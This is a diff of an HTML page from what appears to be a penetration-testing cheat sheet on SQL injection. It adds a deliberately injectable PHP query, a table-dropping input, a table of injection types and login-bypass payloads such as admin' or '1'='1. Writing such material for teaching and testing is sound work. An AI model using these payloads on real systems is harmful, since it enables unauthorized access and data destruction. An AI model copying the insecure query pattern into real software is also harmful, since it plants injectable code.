@@ -633,9 +633,27 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#auth-bypass" class="md-nav__link">
+  <a href="#example-mysql-query-in-php" class="md-nav__link">
     <span class="md-ellipsis">
-      Auth Bypass
+      Example MySQL query in php
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#types-of-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Types of Injection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql-injection-payloads-url-encoding" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQL Injection Payloads URL Encoding
     </span>
   </a>
   
@@ -1351,9 +1369,27 @@
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#auth-bypass" class="md-nav__link">
+  <a href="#example-mysql-query-in-php" class="md-nav__link">
     <span class="md-ellipsis">
-      Auth Bypass
+      Example MySQL query in php
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#types-of-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      Types of Injection
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql-injection-payloads-url-encoding" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQL Injection Payloads URL Encoding
     </span>
   </a>
   
@@ -1659,26 +1695,121 @@
 <li>OR (||)</li>
 </ul>
 <h2 id="sql-injection_1">SQL Injection</h2>
-<h3 id="auth-bypass">Auth Bypass</h3>
+<h3 id="example-mysql-query-in-php">Example MySQL query in php</h3>
+<p><strong>Query:</strong></p>
+<pre><code class="language-php">$conn = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;password&quot;, &quot;users&quot;);
+$searchInput =  $_POST['findUser'];
+$query = &quot;select * from logins where username like '%$searchInput'&quot;;
+$result = $conn-&gt;query($query);
+</code></pre>
+<p><strong>Printing results:</strong></p>
+<pre><code class="language-php">while($row = $result-&gt;fetch_assoc() ){
+    echo $row[&quot;name&quot;].&quot;&lt;br&gt;&quot;;
+}
+</code></pre>
+<p>For the above example entering <code>1'; DROP TABLE users;--</code> would result in:</p>
+<pre><code class="language-sql">select * from logins where username like '%1'; DROP TABLE users;--'
+</code></pre>
+<h3 id="types-of-injection">Types of Injection</h3>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Description</th>
+<th>Use Case</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>In-band: Union-Based</td>
+<td>Direct output via UNION query in specific column.</td>
+<td>When output is displayed in a readable column.</td>
+</tr>
+<tr>
+<td>In-band: Error-Based</td>
+<td>Triggers SQL errors to reveal query output.</td>
+<td>When errors are shown on front-end.</td>
+</tr>
+<tr>
+<td>Blind: Boolean-Based</td>
+<td>Uses true/false conditions to infer data.</td>
+<td>When no output but page behavior changes.</td>
+</tr>
+<tr>
+<td>Blind: Time-Based</td>
+<td>Delays response with Sleep() to infer data.</td>
+<td>When no output or behavior change, but delays detectable.</td>
+</tr>
+<tr>
+<td>Out-of-band</td>
+<td>Sends output to remote location (e.g., DNS).</td>
+<td>When no direct output is accessible.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Note:</strong> In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.</p>
+<h3 id="sql-injection-payloads-url-encoding">SQL Injection Payloads URL Encoding</h3>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>URL Encoded</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>'</td>
+<td>%27</td>
+</tr>
+<tr>
+<td>"</td>
+<td>%22</td>
+</tr>
+<tr>
+<td>#</td>
+<td>%23</td>
+</tr>
+<tr>
+<td>;</td>
+<td>%3B</td>
+</tr>
+<tr>
+<td>)</td>
+<td>%29</td>
+</tr>
+<tr>
+<td>-</td>
+<td>%2D</td>
+</tr>
+<tr>
+<td>=</td>
+<td>%3D</td>
+</tr>
+</tbody>
+</table>
+<h3 id="auth-bypass-payloads">Auth Bypass Payloads</h3>
+<p>MySQL evaluates AND before OR, so a query with an OR and a TRUE condition (e.g., <code>'1'='1</code>) returns TRUE. Use <code>admin' or '1'='1</code> to bypass authentication by ensuring the query evaluates to TRUE while balancing quotes.</p>
 <table>
 <thead>
 <tr>
 <th>Payload</th>
 <th>Description</th>
+<th>How It Works</th>
 </tr>
 </thead>
 <tbody>
 <tr>
 <td><code>admin' or '1'='1</code></td>
 <td>Basic Auth Bypass</td>
+<td>Appends TRUE condition (<code>'1'='1</code>) to bypass login check.</td>
 </tr>
 <tr>
 <td><code>admin')-- -</code></td>
-<td>Basic Auth Bypass With comments</td>
+<td>Basic Auth Bypass With Comments</td>
+<td>Closes query early with <code>)</code> and comments out rest with <code>--</code>.</td>
 </tr>
 </tbody>
 </table>
-<h3 id="auth-bypass-payloads">Auth Bypass Payloads</h3>
 <h3 id="union-injection">Union Injection</h3>
 <table>
 <thead>
